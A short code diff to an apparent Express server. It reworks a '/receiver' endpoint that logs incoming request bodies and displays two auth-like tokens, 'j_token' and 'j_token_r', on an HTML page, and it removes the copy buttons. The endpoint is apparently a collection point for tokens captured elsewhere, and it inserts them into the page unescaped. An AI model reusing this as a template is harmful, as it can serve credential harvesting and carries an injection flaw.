@@ -33,8 +33,10 @@ app.use((req,res,next)=>{
 
 app.post("/receiver", (req, res) => {
 
-    const jToken = req.body.j_token || "";
-    const jTokenR = req.body.j_token_r || "";
+    const data = req.body.message || {};
+
+    const jToken = data.j_token || "";
+    const jTokenR = data.j_token_r || "";
 
     console.log("=== DATA RECEIVED ===");
     console.log(req.body);
@@ -82,23 +84,13 @@ button{
 
 <div class="card">
     <h3>j_token</h3>
-    <div class="value" id="token1">${jToken}</div>
-    <button onclick="copyValue('token1')">Copy</button>
+    <div class="value">${jToken}</div>
 </div>
 
 <div class="card">
     <h3>j_token_r</h3>
-    <div class="value" id="token2">${jTokenR}</div>
-    <button onclick="copyValue('token2')">Copy</button>
+    <div class="value">${jTokenR}</div>
 </div>
-
-<script>
-function copyValue(id){
-    navigator.clipboard.writeText(
-        document.getElementById(id).innerText
-    );
-}
-</script>
 
 </body>
 </html>
